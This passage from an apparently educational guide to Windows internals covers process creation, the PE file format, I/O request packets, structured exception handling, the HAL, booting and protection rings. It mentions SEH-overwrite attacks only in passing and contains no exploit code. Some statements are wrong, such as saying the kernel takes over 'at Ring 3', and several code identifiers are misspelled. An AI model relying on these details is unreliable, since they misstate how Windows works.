<h2 id="the-amended-process-initialization-sequence"><a class="header" href="#the-amended-process-initialization-sequence">The Amended Process Initialization Sequence</a></h2>
<p>With this new information, we can add some additional information to the process initialization sequence we went over previously.</p>
<ol>
<li><strong>User-Mode Initiation with <code>CreateProcess</code></strong>
<ul>
<li>The initialization sequence begins when a user-mode application calls a high-level <code>CreateProcess</code> API
<ul>
<li><code>CreateProcess</code> is a fundamental part of the <code>Win32</code> API, that is primarily responsible for validating a user's request to create a new process, gathering all of the necessary information (i.e., the executable path, command-line arguments, and environment variables) and preparing said information for Step 2</li>
</ul>
</li>
</ul>
</li>
<li><strong>The <code>ntdll.dll</code> Native API Bridge</strong>
<ul>
<li><code>CreateProcess</code> makes an internal, private call to a function within 'ntdll.dll', such as <code>NtCreateUserProcess</code>, which receives the prepared request and sets up the parameters and the system call number in the appropriate CPU registers.</li>
</ul>
</li>
<li><strong>The <code>syscall</code> and Kernel-Mode Transition</strong>
<ul>
<li>The <code>ntdll.dll</code> function executes the <code>syscall</code> instruction, which crucially changes the CPU's privilege level. from user-mode (Ring 3) to kernel-mode (Ring 0) (More on Ring Levels Later). At Ring 3, the operating system's kernel takes over, and control is transferred to the system call dispatcher, typically <code>KiSystemService</code>.</li>
</ul>
</li>
<li><strong>Kernel Object Creation (<code>NtCreateProcessEx</code> &amp; <code>NtCreateThreadEx</code>)</strong>
<ul>
<li><code>KiSystemService</code> looks up the correct kernel function address in the <code>KiServiceTable</code> using the system call number as an index. <code>KiSystemService</code> dispatches the request to the core process creation routines, typically <code>NtCreateProcessEx</code> and <code>NtCreateThreadEx</code> . The kernel's Object Manager creates a Process object and a Thread object, which are privileged data structures that reside in kernel-mode memory. These are the kernel's internal representation of the new process and its initial thread. The initial thread is created in a suspended state, to prevent the thread from executing any code until the kernel is ready.</li>
</ul>
</li>
<li><strong>Creating the Process Handle</strong>
<ul>
<li>After creating the kernel objects, the kernel creates a small unique integer value (the Handle), which is added to the new process's private <strong>Process Handle Table</strong>. The kernel also returns the handle to the original user-mode application, allowing it to interact with the new process in a controlled and secure manner.</li>
</ul>
</li>
<li><strong>The Two-Phase User-Mode Loader</strong>
<ul>
<li>Here, the kernel hands off execution to the user-mode code. The kernel sets the initial thread's instruction pointer to <code>LdrInitializeThunk</code>, a function in <code>ntdll.dll</code>, then resumes its execution
<ul>
<li><code>LdrInitializeThunk</code> is the process's first user-mode code to run, and it performs a two-phase loading and initialization process:
<ol>
<li><strong>Dependency Resolution</strong>(LdrpInitialize): A deep, recursive traversal of the executable's import address table and all of its dependencies. The loader checks for required DLLs and if a DLL is not yet loaded, it calls the Memory Manager to map the DLL's image from disk into the process's virtual address space. The loader then recursively processes the new DLL's dependencies, ensuring the entire dependency tree is mapped.</li>
<li><strong>Initialization Routines</strong> (LdrpRunInitializeRoutines): After all dependencies are mapped, this phase focuses on initialization. The loader iterates through the newly added DLLs and for each DLL, it calls the <code>DllMain</code> function with the <code>DLL_PROCESS_ATTACH</code> notification set for <code>fdwReason</code>. This gives each DLL a chance to initialize its own internal state, allocate resources, and prepare for use before the main executable is run.</li>
</ol>
</li>
</ul>
</li>
</ul>
</li>
<li><strong>The Final Handoff to the Application</strong>
<ul>
<li>Once the loading phases have completed, <code>LdrInitializeThunk</code> makes a final jump, transferring control to the application's designated entry point (typically <code>main</code> or <code>WinMain</code>). Here, the application's code begins to execute, and the process is fully initialized and ready to go.</li>
</ul>
</li>
</ol>
<h2 id="executable-format"><a class="header" href="#executable-format">Executable Format</a></h2>
<p>The Windows Executable File Format is called a <code>Portable Executable</code>(<strong>PE</strong>). <strong>PE</strong> files are relocatable, meaning they can be loaded at different virtual addresses each time they are loaded. In this section, we will elaborate on how executables are loaded into virtual memory, the various section of the executable, and some of the security measures put in place to protect data and code within these sections.</p>
<h3 id="base-address-and-rva"><a class="header" href="#base-address-and-rva">Base Address and RVA</a></h3>
<p>The <strong>Base Address</strong> is the preferred virtual memory address where a module is compiled to be loaded. It is used by the linker as a reference point for all internal addressing.</p>
<p>On 32-bit (x86) Windows, the virtual address space is limited to 4GB and the preferred base address for an executable is <code>0x00400000</code>. If a <code>DLL</code> is compiled to be loaded at this address, and an executable is already there, a collision occurs.</p>
<p>On 64-bit (x86-64) Windows, the virtual address space is theoretically 15 exabytes (2⁶⁴ bytes) large in volume. A preferred base address for an executable is <code>0x0000000140000000</code>.</p>
<p>In order to make code flexible and independent of its final load address, all internal pointers and jump targets are stored as an offset from the module's preferred base address, being the <strong>Relative Virtual Address</strong>(RVA). The final, absolute virtual address of any object in a module is always calculated at runtime:</p>
<pre><code>Absolute Virtual Address = Module Load Address + RVA
</code></pre>
<h3 id="image-sections"><a class="header" href="#image-sections">Image Sections</a></h3>
<p>PE files are highly structured and composed of distinct Image Sections, each with a specific purpose and its own set of memory permissions. Common sections include:</p>
<ul>
<li><code>.text</code> or <code>CODE</code>: Contains the executable machine code. Has Read and Execute (RX) permissions</li>
<li><code>.rdata</code>: Contains read-only data, such as constant strings and the import address table. This section has Read-Only (R) permissions.</li>
<li><code>.data</code>: Contains initialized global and static variables, Has RW permissions.</li>
<li><code>.reloc</code>: Contains the Base Relocation Table, used by the OS loader to fix absolute pointers.</li>
</ul>
<p>The RVA of an object is always an offset within its section, and the OS loader uses the PE headers section table to map this RVA to the correct virtual memory location.</p>
<h4 id="section-alignment"><a class="header" href="#section-alignment">Section Alignment</a></h4>
<p>The file has a different alignment on disk than it does when loaded into memory, a design choice made to optimize for both the disk space and memory usage. There are two primary alignment values found in the PE header:</p>
<ul>
<li>
<p><code>FileAlignment</code>: This value dictates how each section is aligned on disk. Typically, this is a small numeric value, which is also a power of 2 (i.e., 512 bytes (0x200))</p>
<ul>
<li>For instance, if a section's raw size is 1200 bytes, it will be padded to 1536 bytes (the next multiple of 512). The OS loader reads the file from disk using these alignments.</li>
</ul>
</li>
<li>
<p><code>SectionAlignment</code>:This value dictates how each section is aligned in virtual memory. Typically, this is a large numeric value, whcih is a power of 2 (i.e. 4096 bytes (0x1000)). When the sections are mapped into cirtual memory by the OS, each section must begin on a page boundary.</p>
<ul>
<li>For instance, if a section's size in memory is 5000 bytes, it will occupy two pages (8192 bytes), even if it only uses a small portion of the second page.</li>
</ul>
</li>
</ul>
<p>The distinct alignments between the disk and virtual memory allow the PE file to be compact on disk (saving storage and download. time) while ensuring that, once loaded, its sections are perfectly aligned with the memory manager's page-based system. An OS's memory manager works with memory pages, not individual bytes, so aligning sections to page boundaries makes it highly efficient to apply memory permissions (<code>R</code>/<code>W</code>/<code>X</code>) to each section. Also consider, when statically analyzing a file, the RVA is determined by the Section Alignment of the executable, not the File Alignment.</p>
<h4 id="the-critical-role-of-relocations"><a class="header" href="#the-critical-role-of-relocations">The Critical Role of Relocations</a></h4>
<p>The need for relocations is driven by two primary reasons:</p>
<ol>
<li><strong>Reason 1: Avoiding DLL Collisions</strong> (Primarily 32-bit)
In the early days of Windows, DLLs were often compiled with a preferred base address. When two different DLLs had the same preferred address, a <strong>DLL Collision</strong> occured. The OS loader was then forced to find a new, available virtual memory space for one of them. Since the code in the relocated DLL was compiled with absolute addresses that are now wrong, a relocation was necessary to fix all internal pointers.</li>
<li><strong>Reason 2: Enabling ASLR and Security</strong> (Primarily 64-bit)
Address Space Layout Randomization (ASLR) is a security feature that randomizes the base address of every module each time a program runs. The randomness makes it impossible for an attacker to reliably predict the location of code or data before runtime. ASLR requires every single module to go through the relocation process, fixing all of its internal absolute pointers to point to the correct, randomly located targets.</li>
</ol>
<pre><code class="language-C">#include &lt;iostream&gt;

// Assume this program is compiled with a preferred base address of 0x00400000

// This is a global variable. It resides in the '.data' section
int global_data = 100;

// This pointer will be initialized with the ABSOLUTE dadress
// of 'global_data'. It will need to be fixed at runtime
int* global_data_pointer = &amp;global_data

int main(){
    // The linker has hardcoded the virtual address of 'global_data'
    // into the 'global_data_pointer' variable. If the program is
    // loaded at a different address (due to relocation), this pointer's
    // value will be wrong.

    // The OS loader will find this pointer's location in
    // the '.reloc' section and fix its value at runtime before
    // the 'main' function starts.

    // Let's assume the program's preferred base address is `0x00400000` and
    // 'global_data' has an RVA of '0x1000'.
    // The linker will initialize 'global_data_pointer' to '0x00401000'

    // When the program is loaded at a random base addres, say '0x7b000000',
    // the loader will 'relocate' the pointers value
    // New Value = 0x7b000000 + (0x00401000 - 0x00400000) = 0x7b001000

    // The loader will change the value stored in 'global_data_pointer' to
    // 0x7b001000 before the program starts executing 'main()'

    // The program can now safely dereference the pointer
    std::cout &lt;&lt; "The value pointed to by global_data_pointer is: " &lt;&lt; *global_data_pointer &lt;&lt; std::endl;
    return 0;
}
</code></pre>
<div id="admonition-note-11" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-11-title">
<div class="admonition-title">
<div id="admonition-note-11-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Windows.html#admonition-note-11"></a>
</div>
<div>
<p><strong>*</strong> and <strong>&amp;</strong>
In C-like languages:</p>
<p><code>*</code> is the dereference operator. It gets the value stored at the address a pointer is referencing.</p>
<p><code>&amp;</code> is the "address of" operator. It gets the address of some variable stored in memory.</p>
</div>
</div>
<h3 id="sections-of-an-image"><a class="header" href="#sections-of-an-image">Sections of an Image</a></h3>
<h4 id="dos-header"><a class="header" href="#dos-header">DOS Header</a></h4>
<p>The <strong>DOS Header</strong> ensures backward compatibility and a graceful error message system on systems that don't support the PE format, "This program cannot be run in DOS mode".</p>
<pre><code class="language-C">typedef struct _IMAGE_DOS_HEADER{
    WORD e_magic;     // Magic number: "MZ"
    [...trunc...]
    LONG e_lfanew;    // File address of the new PE header
}IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER
</code></pre>
<p>The most important fields of the <code>DOS Header</code> are:</p>
<ul>
<li><code>e_magic</code>: the first two bytes of the DOS header, which must equal <code>MZ</code> (0x5A4D)</li>
<li><code>e_lfanew</code>: A pointer to the start of the <code>IMAGE_NT_HEADERS</code> structure (the PE Headers)</li>
</ul>
<h4 id="pe-header"><a class="header" href="#pe-header">PE Header</a></h4>
<p>The <strong>PE Header</strong> is composed of metadata at the beginning of Windows programs which provides information about the file's contents, architecture, required libraries, and entry point for the operating system to load and run the program. The PE Header is composed of a signature, a <code>FileHeader</code> and an <code>Optional Header</code>. The <code>IMAGE_NT_HEADERS</code> structure serves as the main header, and its C structure is defined to accommodate both 32-bit and 64-bit systems:</p>
<pre><code class="language-C">typedef struct _IMAGE_NT_HEADERS64{
    DWORD Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
}IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;

typedef struct _IMAGE_NT_HEADERS {
    DWORD Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER32 OptionalHeader;
}IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;
</code></pre>
<p>The <code>_IMAGE_NT_HEADERS*</code> structure references two data structures which contain the actual PE header, being <code>IMAGE_FILE_HEADER</code> and <code>IMAGE_OPTIONAL_HEADER*</code>:</p>
<pre><code class="language-C">typedef struct _IMGAE_FILE_HEADER {
    WORD Machine;
    WORD NumberOfSections;
    [...trunc...]
}IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

typedef struct _IMAGE_OPTIONAL_HEADER64 {
    WORD Magic;
    [...trunc...]
    DWORD NumberofRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
}IMAGE_OPTIONAAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;
</code></pre>
<p><strong>DataDirectory</strong> is an array of additional data structures that are stored inside the PE header including <code>Export Table</code>, <code>Resource Table</code>, <code>Thread Local Storage Table</code>, and more. It is due to this critical data structure that the <strong>Optional Headers</strong> are not optional for Windows <strong>PE</strong> files. More on this later.</p>
<h4 id="imports-and-exports"><a class="header" href="#imports-and-exports">Imports and Exports</a></h4>
<p><strong>Dynamic Link Libraries</strong> are a repository of executable code and data that can be shared among multiple programs. They can either be <strong>statically</strong> or <strong>dynamically</strong> linked to a compiled program. When <strong>statically linking</strong>, all required library code is copied directly into the final executable at compile time. When <strong>dynamically linking</strong>, the compiler includes only import information in the executable's PE header. The required DLLs are then loaded by the OS loader at runtime.</p>
<p><strong>Imports</strong> and <strong>Exports</strong> are the mechanisms that enable the dynamic linking process of executables.</p>
<p>For instance, consider an executable that references functions in other executables while it is being compiled and linked:
<img src="https://hackmd.io/_uploads/r1spBhvAgl.png" alt="image" /></p>
<blockquote>
<p>Diagram of the C/C++ Compilation Process
<strong>preprocessing</strong> -&gt; <strong>compiling</strong> -&gt; <strong>assembling</strong> -&gt; <strong>linking</strong></p>
</blockquote>
<p>The compiler and linker have no idea of the imported functions' actual addresses. These are determined at runtime. To address this problem, the linker creates a special import table that lists all the functions imported by the current module, by their names. The <code>import table</code> contains a list of modules that a module utilizes and the list of functions called within each of those modules. When the current module is loaded, the loader loads every module listed in the import table and identifies the address of each function listed. These addresses are found by going over the imported module's export table, which contains the names and RVAs of every exported function.</p>
<p>When the current module needs to call into an imported function, the call typically looks like this:</p>
<pre><code class="language-asm64">call [Some Address]
</code></pre>
<p>Where <code>SomeAddress</code> is a pointer into the executable import address table (IAT). When the module is linked, the IAT is nothing but a list of empty values. When the module is loaded, the linker resolved each entry in the IAT to point to the actual function in the imported module.</p>
<p><img src="https://hackmd.io/_uploads/BkprThPAlg.png" alt="image" /></p>
<blockquote>
<p>Diagram of PE Imports and Exports</p>
</blockquote>
<h3 id="pe-file-directories"><a class="header" href="#pe-file-directories">PE File Directories</a></h3>
<p>As discussed before, <strong>DataDirectory</strong> is a data structure stored in the <code>IMAGE_OPTIONAL_HEADER</code> section of the PE. This is a crucial structure that the OS loader uses to find essential information.</p>
<p>Here is a breakdown of key PE file directories:</p>
<ul>
<li><code>Export Table</code>: A list of names and RVAs for all exported functions in the current module.
<ul>
<li><strong>Associated Data Structure</strong>: <code>IMAGE_EXPORT_DIRECTORY</code></li>
<li><strong><code>DataDirectory</code> Entry [idx]</strong>: <code>IMAGE_DIRECTORY_ENTRY_EXPORT[0]</code></li>
</ul>
</li>
<li><code>Import Table</code>: A list of the names of modules and the functions used within those modules by the current module.
<ul>
<li><strong>Associated Data Structure</strong>: <code>IMAGE_IMPORT_DESCRIPTOR</code></li>
<li><strong><code>DataDirectory</code> Entry [idx]</strong>: <code>IMAGE_DIRECTORY_ENTRY_IMPORT[1]</code></li>
</ul>
</li>
<li><code>Resource Table</code>: Points to the executable's resource data, such as icons, images, menus, and cursors.
<ul>
<li><strong>Associated Data Structure</strong>: <code>IMAGE_RESOURCE_DIRECTORY</code></li>
<li><strong><code>DataDirectory</code> Entry [idx]</strong>: <code>IMAGE_DIRECTORY_ENTRY_RESOURCE[2]</code></li>
</ul>
</li>
<li><code>Base Relocation Table</code>: A list of addresses that must be adjusted in the event of relocation
<ul>
<li><strong>Associated Data Structure</strong>: <code>IMAGE_BASE_RELOCATION</code></li>
<li><strong><code>DataDirectory</code> Entry [idx]</strong>: <code>IMAGE_DIRECTORY_ENTRY_BASERELOC[5]</code></li>
</ul>
</li>
<li><code>Debugging Information</code>: Debugging info for the executable, often in the form of a link to an external symbol file.
<ul>
<li><strong>Associated Data Structure</strong>: <code>IMAGE_DEBUG_DIRECTORY</code></li>
<li><strong><code>DataDirectory</code> Entry [idx]</strong>: <code>IMAGE_DIRECTORY_ENTRY_DEBUG[6]</code></li>
</ul>
</li>
<li><code>Thread Local Storage Table</code>: Points to a special section that contains thread-local variables.
<ul>
<li><strong>Associated Data Structure</strong>: <code>IMAGE_TLS_DIRECTORY</code></li>
<li><strong><code>DataDirectory</code> Entry [idx]</strong>: <code>IMAGE_DIRECTORY_ENTRY_TLS[9]</code></li>
</ul>
</li>
<li><code>Load Configuration Table</code>: Contains configuration elements for special security features that list legitimate exception handlers.
<ul>
<li><strong>Associated Data Structure</strong>: <code>IMAGE_LOAD_CONFIG_DIRECTORY</code></li>
<li><strong><code>DataDirectory</code> Entry [idx]</strong>: <code>IMAGE_DIRECTORY_LOAD_CONFIG[10]</code></li>
</ul>
</li>
<li><code>Bound Import Table</code>: An import related table used to confirm that pre-resolved addresses into an exporting module are still valid.
<ul>
<li><strong>Associated Data Structure</strong>: <code>IMAGE_BOUND_IMPORT_DESCRIPTOR</code></li>
<li><strong><code>DataDirectory</code> Entry [idx]</strong>: <code>IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT[11]</code></li>
</ul>
</li>
<li><code>Import Address Table</code>: A list of entries for each imported function, which are initialized at load time to the actual addresses of the imported functions.
<ul>
<li><strong>Associated Data Structure</strong>: A List of 32-bit Pointers</li>
<li><strong><code>DataDirectory</code> Entry [idx]</strong>: <code>IMAGE_DIRECTORY_ENTRY_IAT</code></li>
</ul>
</li>
</ul>
<h2 id="input-and-output"><a class="header" href="#input-and-output">Input and Output</a></h2>
<p>The <code>I/O</code> System is a combination of kernel components that manage the device drivers running in the system and the communication between applications and device drivers. The design of the system is modular, allowing for immersive flexibility and security.</p>
<p>First, we have the <strong>User-Mode Interface</strong>. At this level, <code>I/O</code> requests are handled by documented APIs. For instance, when a process needs to read from a file, it doesn't directly access the hard drive. Instead, it makes a high-level API call, like <code>ReadFile()</code> or <code>WriteFile()</code>, which in turn, makes a system call to the kernel via <code>ntdll.dll</code> and the <code>KiSystemService</code> trap.</p>
<p>Once the request enters the kernel, control is passed to the I/O manager. The <strong>I/O Manager</strong> is a central component of the Windows kernel that is responsible for all I/O-related operations and acts as a dispatcher, taking a user's request and sending it to the correct device driver. The I/O Manager builds a data structure called an <strong>I/O Request Packet</strong> (IRP). An IRP is a formal request that describes the I/O operation (i.e., read, write), which file to access, and how many bytes to transfer. The I/O Manager creates an IRP and populates it with information form the user-mode request. Then, the IRP is sent down a chain of device drivers known as the <strong>driver stack</strong>. This allows for the modular design. For instance, a request to read from a file on a USB thumb drive would first go to the file system driver (<code>ntfs.sys</code>), then the volume manager driver, and finally to the USB host controller driver. Each driver on the stack handles its part of the request.</p>
<p>There are optional drivers that may sit between other drivers on the driver stack, called <strong>Filter Drivers</strong>. Filter Drivers are inserted in the driver stack to inspect, modify, or block IRPs as they pass through. They can be attached to any part of the driver stack. For instance, an antivirus program may insert a filter driver into the file system driver stack to intercept all IRPs and scan the file contents for malware before allowing the IRP to proceed.</p>
<p>At the bottom of the driver stack is the <strong>bus driver</strong>, which takes the IRP and sends specific commands to the physical hardware to facilitate the request. <strong>Direct Memory Access</strong> (DMA) is a crucial performance optimization method which transfers data directly between the device and the application's memory, without constantly involving the CPU.</p>
<p>When the hardware operation is complete, it generates an interrupt. The I/O Manager processes this interrupt, marks the IRP as complete, and the results are passed back up the driver stack. The IRP is returned to the user-mode application, which can continue its execution.</p>
<h2 id="structured-exception-handling-seh"><a class="header" href="#structured-exception-handling-seh">Structured Exception Handling (SEH)</a></h2>
<p><strong>Structured Exception Handling</strong> is a robust, language-independent mechanism in Windows that allows applications and the operating system itself to gracefully respond to and recover from unexpected events, called <strong>exceptions</strong>. Exceptions can range from hardware-generated faults to software-defined errors. They are events that occur during a programs execution that disrupt the normal flow of instructions.</p>
<ul>
<li><strong>Hardware Exceptions</strong>: Detected by the CPU, including:
<ul>
<li><code>Access Violation</code> (0xC0000005): Attempting to read from or write to an invalid or protected memory address.</li>
<li><code>Divide by Zero</code> (0xC0000094): An arithmetic operation where the divisor is zero.</li>
<li><code>Illegal instruction</code> (0xC000001D): Attempting to execute an invalid CPU instruction.</li>
</ul>
</li>
<li><strong>Software Exceptions</strong>: Explicitly generated by an application or the operating system (i.e., <code>RaiseException()</code> API Call) and can be used for custom error reporting.</li>
</ul>
<h3 id="32-bit-seh"><a class="header" href="#32-bit-seh">32-bit SEH</a></h3>
<p>On 32-bit systems, SEH is implemented on top of a singly linked list of exception handler records that resides directly on each threads' stack. The <strong>Thread Information Block</strong> (TIB) is a per-thread data structure containing vital information about the thread. Typically, the TIB is referenced by some offset of the <code>FS</code> registers. The TIB can be used to reference the address of the head of the Exception Handler List.</p>
<p>The Exception Handler List is a singly linked list of <code>EXCEPTION_REGISTRATION_RECORD</code>s, which are pushed onto the stack by functions that contain SEH blocks (i.e., <code>__try/__except</code>). It takes on the following form:</p>
<pre><code class="language-C">typedef struct _EXCEPTION_REGISTRATION_RECORD {
  struct _EXCEPTION_REGISTRATION_RECORD *Next;
  PEXCEPTION_ROUTINE Handler;
} EXCEPTION_REGISTRATION_RECORD;
</code></pre>
<p>Where:</p>
<ul>
<li><code>Next</code>: A pointer to the previous <code>EXCEPTION_REGISTRATION_RECORD</code> on the stack, forming the chain</li>
<li><code>Handler</code>: A pointer to the specific exception handler function (the code within the <code>__except</code> block) that should be executed if any exception occurs within the associated <code>__try</code> block's scope.</li>
</ul>
<p>When a function containing a <code>__try</code> block is entered, a new <code>EXCEPTION_REGISTRATIN_RECORD</code> is created on the stack, the <code>Next</code> pointer is set to the current value of <code>FS:[0]</code> (which points to the previous handler on the stack), and <code>FS:[0]</code> is updated to point to the new record, making the new record the head of the exception handler chain.</p>
<p>If an exception occurs, the Operating System walks this linked list, starting from the head at <code>FS:[0]</code>, checks each handler to see if it can handle the exception and if a handler is found it is executed. If not, the search continues until the end of the list is reached. This is referred to as <strong>Stack Unwinding</strong>.</p>
<p>This stack-based approach is vulnerable to <strong>buffer overflow attacks</strong> (See <code>Appendix B: Manually Writing Shellcode for Windows</code> for more details). An attacker could overwrite a stack buffer to corrupt the <code>EXCEPTION_REGISTRATION_RECORD</code>, redirecting the <code>Next</code> pointer or the handler address to a malicious location and taking control of the program's execution flow.</p>
<h3 id="64-bit-seh"><a class="header" href="#64-bit-seh">64-bit SEH</a></h3>
<p>64-bit SEH is table based. Instead of using the stack, the compiler generates static, read-only tables that describe the exception handlers and stack unwinding information for each function. These tables are stored in the executable's data sections (<code>.pdata</code> and <code>.xdata</code>).</p>
<p>There is no dynamic linked list and no manipulation of segment registers (i.e., <code>FS</code> or <code>GS</code>). The process of entering a <code>__try</code> block incurs almost no runtime overhead because no data is pushed onto the stack.u</p>
<p>When an exception occurs, the operating system's exception dispatcher analyzes the call stack. For each function on the stack, it consults the pre-generated exception tables to determine the function's structure and any associated exception handlers. Then, it unwinds the stack by virtually reversing the function calls, restoring register states and executing the appropriate handler if one is found.</p>
<p>This table-based model provides more security by preventing reads to the tables and only uses computing resources when an exception is thrown.</p>
<p>The <code>GS</code> segment register is used to access per-thread data. The <code>TIB</code>, which is pointed to by <code>GS:[0]</code>, contains a pointer to the <code>PEB</code>.</p>
<h2 id="the-hardware-abstraction-layer"><a class="header" href="#the-hardware-abstraction-layer">The Hardware Abstraction Layer</a></h2>
<p>The <strong>Hardware Abstraction Layer</strong> (HAL) is the kernel-mode component that isolates the operating system from platform-specific hardware details by providing a uniform interface to interrupts, timers, processors, and low-level hardware mechanisms. It can be found at <code>C:\Windows\System32\hal.dll</code>.</p>
<p>Whenever a device raises an interrupt, the following process occurs:</p>
<ol>
<li>
<p><strong>The Hardware Signals the Interrupt Controller</strong></p>
<ul>
<li>When a device (like the keyboard or network card) has data ready, it sends an electrical signal to the <strong>Interrupt Controller</strong> (usually the <strong>APIC</strong> - Advanced Programmable Interrupt Controller). The hardware doesn't know what Windows or drivers are. It only knows how to pulse a wire or send a message over the <strong>PCIe</strong> (Peripheral Component Interconnect Express). The APIC gathers these physical signals and prioritizes them so that the CPU isn't overwhelmed.</li>
</ul>
</li>
<li>
<p><strong>The HAL Translates It Into a Logical Interrupt</strong></p>
<ul>
<li>Different motherboards use different wiring for interrupts. The HAL maps these physical hardware lines to a <strong>Global System Interrupt</strong> (GSI). This ensures that the Windows kernel doesn't have to be rewritten for every different type of motherboard (Intel, ARM, AMD). Instead, it waits for the HAL to report which interrupts have occurred.</li>
</ul>
</li>
<li>
<p><strong>The Kernel Dispatches the Interrupt</strong></p>
<ul>
<li>Once the HAL identifies the interrupt, the kernel looks up the appropriate function in the <strong>Interrupt Descriptor Table</strong> (IDT). The kernel handles the <strong>Context Switch</strong> as well. It pauses whatever the current user operation is (i.e., browsing the web) and saves whatever work has been done so the CPU can focus on the hardware event. Then, it dispatches control to the specific <strong>Interrupt Service Routine</strong> registered by the device driver.</li>
</ul>
</li>
<li>
<p><strong>The Driver Handles the Device Event</strong></p>
<ul>
<li>The <strong>Device Driver</strong> finally executes, which can be broken up into two functions:
<ul>
<li><strong>The Interrupt Service Routine</strong> (ISR): Acknowledges the hardware and quickly clears the interrupt so the CPU can go back to work.</li>
<li><strong>The Deferred Procedure Call</strong> (DPC): A mechanism that lets high-priority tasks quickly finish their critical work and schedule less urgent tasks for later execution at a lower priority, preventing system stalls and maintaining responsiveness. Ensures the system remains responsive and doesn't lock up while processing one device's data. It is used by driver to handle heavy processing after an interrupt is acknowledged.</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="the-boot-up-process"><a class="header" href="#the-boot-up-process">The Boot-Up Process</a></h2>
<h3 id="phase-1-the-hardware-firmware-handshake"><a class="header" href="#phase-1-the-hardware-firmware-handshake">Phase 1: The Hardware-Firmware Handshake</a></h3>
<ol>
<li><strong>Power-On Self-Test</strong> (POST): When the power button is pressed, the computer's motherboard runs a hardware check, the POST, to ensure that components, such as the CPU, RAM, and GPU are functioning.</li>
<li><strong>Firmware Loading</strong>: After the POST, the motherboard's firmware (<code>BIOS</code> or <code>UEFI</code>) takes control. It's main job is to locate and load the first piece of software from the storage device.</li>
<li><strong>Bootloader Execution</strong>: The firmware reads a small, initial program, called the <strong>bootloader</strong>, from a designated sector on your hard drive. The bootloader is the first executable to run on the machine and is primarily responsible for starting the Operating System.</li>
</ol>
<h3 id="phase-2-the-kernel-mode-boot"><a class="header" href="#phase-2-the-kernel-mode-boot">Phase 2: The Kernel-Mode Boot</a></h3>
<ol>
<li><strong>Loading the Kernel</strong>: The bootloader loads the kernel executable (<code>ntoskrnl.exe</code>) into memory and transfers control to it. It is now the only application running on the system.</li>
<li><strong>Kernel initialization</strong>: The kernel begins its own setup, initialinig device drivers, core data structures, and other key components. This includes the:
<ul>
<li><code>Memory Manager</code>: Establishes the physical and virtual memory spaces for the entire system.</li>
<li><code>Object Manager</code>: Creates the initial objects that represent system resources, including the first process objects.</li>
<li><code>Process Manager</code>: Prepares the environment for process creation.</li>
</ul>
</li>
</ol>
<h3 id="phase-3-user-mode-genesis"><a class="header" href="#phase-3-user-mode-genesis">Phase 3: User-Mode Genesis</a></h3>
<ol>
<li><strong>Session Manager (<code>smss.exe</code>) Launch</strong>: The kernel's initialization routine launches the Session Manager Subsystem (<code>smss.exe</code>), the first user-mode process on the entire system, which all other user-mode processes can be traced back to.</li>
<li><strong>Building the First Processes</strong>: As <code>smss.exe</code> launches its child processes, the kernel's subsystem performs a series of operations for each one:
<ul>
<li><code>Object Manager</code>: Creates a new Process Object for each child process (i.e., <code>winlogon.exe</code>, <code>csrss.exe</code>) and gives each process its own dedicated Process Handle Table.</li>
<li><code>Memory Manager</code>: Where the Virtual Address Space is created for each new process. The Memory Manager uses VAD Trees to organize these virtual address spaces. It then maps Virtual Pages to Physical Frames in RAM, creating the process's Working Set. This ensures each process has the memory it needs to run, even though they can't access each other's memory directly.</li>
</ul>
</li>
<li><strong>Connecting to the Kernel</strong>: These initial processes begin making requests to the kernel, via <code>ntdll.dll</code>.</li>
</ol>
<h3 id="phase-4-the-final-steps-to-user-interaction"><a class="header" href="#phase-4-the-final-steps-to-user-interaction">Phase 4: The Final Steps to User Interaction</a></h3>
<ol>
<li><strong>User Login</strong>: <code>winlogon.exe</code> handles the login screen. Once the user successfully authenticates, <code>winlogon.exe</code> starts the user's shell, typically <code>explorer.exe</code>. This is the application that give you your desktop, taskbar, and Start Menu.</li>
<li><strong>The <code>CreateProcess</code> API</strong>: <code>explorer.exe</code>, and many other applications can now use the <code>CreateProcess</code> API to create new processes, initializing the <strong>process initialization sequence</strong>.</li>
</ol>
<h2 id="users-and-privileges"><a class="header" href="#users-and-privileges">Users and Privileges</a></h2>
<p>Operating system authorizations are designed to handle multiple users with multiple roles and permissions. The abstraction of user roles and permissions on a system is set up and facilitated by a system called a <strong>protection ring</strong>, which specifies limits and enforces the functionality of users on a system and their corresponding access to resources.</p>
<p>A <strong>Protection Ring</strong> is a hardware-enforced mechanism on many CPU architectures that provides different levels of access to system resources. The rings are arranged in a hierarchy, with the most privileged level being <code>Ring 0</code> and the least privileged level being <code>Ring 3</code>:
<img src="https://hackmd.io/_uploads/HkBPOJORle.png" alt="image" /></p>
<blockquote>
<p>Diagram of how Protection Rings are organized</p>
</blockquote>
<p><code>Kernel-Mode</code> is synonymous with <code>Ring 0</code>. It is where the core of the OS resides, including <code>ntoskrnl.exe</code>, <code>hal.dll</code> (Hardware Abstraction Layer), and kernel-mode drivers like <code>win32k.sys</code>.</p>
<p><code>User-Mode</code> is synonymous with <code>Ring 3</code>, where user applications and user-mode components (i.e., <code>winlogon.exe</code>) reside. It exists for untrusted processes, which should be strictly regulated by the operating system.</p>
<p>Modern CPUs also support additional execution states, which are unofficially referred to as <code>Ring -1</code> (Hypervisor Mode), <code>Ring -2</code> (System Management Mode), and <code>Ring -3</code> (Platform Security Processor), all of which have greater control of and access to system resources than the installed OS. We touch on this more later.</p>
<h3 id="transitioning-from-ring-3-to-ring-0"><a class="header" href="#transitioning-from-ring-3-to-ring-0">Transitioning from Ring 3 to Ring 0</a></h3>
<p>A program must use a special instruction to <code>trap</code> into the kernel:</p>
<ul>
<li><code>SYSENTER</code> (Newer 32-bit Systems): The modern, fast method for making a system call within a 32-bit application.
<ul>
<li>Before executing <code>SYSENTER</code>, the user-mode code prepares the system call by loading specific registers with data:
<ul>
